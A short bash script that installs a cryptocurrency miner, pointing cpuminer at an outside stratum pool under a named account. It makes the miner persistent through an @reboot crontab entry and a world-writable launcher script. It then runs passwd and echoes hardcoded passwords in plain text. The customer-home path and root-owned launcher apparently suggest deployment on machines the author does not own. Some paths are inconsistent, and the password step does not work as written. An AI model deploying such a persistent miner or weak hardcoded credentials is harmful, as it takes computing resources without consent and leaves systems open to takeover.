#!/bin/bash
output() {
        printf "\E[0;33;40m"
        echo $1
        printf "\E[0m"
}
output "";
output "Create bash file"
cd /home/customer/cpuminer-opt
echo "" > zzzz.sh
echo "#!/bin/bash" >> zzzz.sh
echo "cd /root/cpuminer-opt" >> zzzz.sh
echo "./cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u qionggao.1 -p x" >> zzzz.sh
chmod 0777 zzzz.sh
output "Add cronjob"
sudo crontab -l > mycron
echo "@reboot /root/cpuminer-opt/zzzz.sh" >> mycron
crontab mycron
rm mycron
output "";
output "passwd"
passwd
echo "Zxcv1234@@@@"
output "";
echo "Abcg145!@#"
echo "Abcg145!@#"
